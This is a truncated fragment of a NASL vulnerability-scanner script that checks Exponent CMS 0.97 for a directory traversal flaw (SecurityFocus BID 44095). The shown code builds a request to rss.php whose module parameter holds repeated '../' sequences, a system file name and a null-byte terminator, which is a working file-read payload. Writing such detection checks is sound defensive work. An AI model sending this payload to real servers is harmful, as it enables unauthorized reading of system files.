...
# $Id: gb_exponet_cms_44095.nasl 14 2013-10-27 12:33:37Z jan $
#
...
Exponent CMS 0.97 is vulnerable; other versions may also be affected.";
...
desc = "
 ...
 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44095");
 ...
 script_summary("Determine if installed Exponent CMS is vulnerable");
...
if(!dir = get_dir_from_kb(port:port, app:"exponent"))exit(0);
files = traversal_files();

foreach file (keys(files)) {
   
  url = string(dir,"/rss.php?module=",crap(data:"../",length:3*9),files[file],"%00"); 
